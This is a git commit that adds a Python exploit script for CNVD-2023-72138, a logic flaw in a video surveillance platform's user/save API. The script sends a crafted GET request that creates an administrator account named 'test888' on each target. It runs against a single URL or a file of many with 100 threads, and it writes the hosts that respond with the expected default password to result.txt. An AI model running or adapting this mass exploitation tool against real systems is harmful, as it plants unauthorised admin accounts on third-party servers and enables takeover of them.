07eaaba03f81835e085bb6d118ba1dfb3ee35c96
Bojue <1493824324@qq.com>
2024-07-02 22:32:35 +0800

    Add files via upload

---
+++ 某iveGBS usersave 逻辑缺陷漏洞(CNVD-2023-72138)/CNVD-2023-72138.py
@@ -0,0 +1,69 @@
+# 某iveGBS user/save 逻辑缺陷漏洞
+
+import requests,argparse,sys
+from multiprocessing.dummy import Pool
+#忽略警告
+requests.packages.urllib3.disable_warnings()
+RED = '\033[91m' #输出颜色
+RESET = '\033[0m'
+
+
+def banner():
+    banner = """
+ ██▓    ▄▄▄       ███▄ ▄███▓    ██ ▄█▀ ██▓ ███▄    █   ▄████ 
+▓██▒   ▒████▄    ▓██▒▀█▀ ██▒    ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
+▒██▒   ▒██  ▀█▄  ▓██    ▓██░   ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
+░██░   ░██▄▄▄▄██ ▒██    ▒██    ▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓
+░██░    ▓█   ▓██▒▒██▒   ░██▒   ▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒
+░▓      ▒▒   ▓▒█░░ ▒░   ░  ░   ▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
+ ▒ ░     ▒   ▒▒ ░░  ░      ░   ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░ 
+ ▒ ░     ░   ▒   ░      ░      ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
+ ░           ░  ░       ░      ░  ░    ░           ░       ░ 
+                                        info:某iveGBS user/save 逻辑缺陷漏洞
+                                        version:1.0 author:YeahSir               
+"""
+    print(banner)
+
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description='某iveGBS user/save 逻辑缺陷漏洞')
+    parser.add_argument('-u','--url',dest='url',type=str,help='please input your link')
+    parser.add_argument('-f','--file',dest='file',type=str,help='please input your file path')
+    args = parser.parse_args()
+    #判断输入的参数是单个还是文件
+    if args.url and not args.file:
+        poc(args.url)
+    elif not args.url and args.file:
+        url_list=[]
+        with open(args.file,"r",encoding="utf-8") as f:
+            for url in f.readlines():
+                url_list.append(url.strip().replace("\n",""))
+        #多线程
+        mp = Pool(100)
+        mp.map(poc, url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+
+def poc(target):
+    payload = "/api/v1/user/save?ID=&Username=test888&Role=%E7%AE%A1%E7%90%86%E5%91%98&Enable=true"
+    url = target+payload
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
+    }
+
+    try:
+        re = requests.get(url=url,headers=headers,verify=False,timeout=5)
+        if re.status_code == 200 and '12345678' in re.text:
+            print( f"{RED}[+] {target} 存在逻辑缺陷漏洞！{RESET}")
+            with open('result.txt',mode='a',encoding='utf-8')as ft:
+                ft.write(target+'\n')
+        else:
+            print(f'该{target}不存在逻辑缺陷漏洞')
+    except Exception as e:
+        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")
+
+
+if __name__ == '__main__':
+    main()
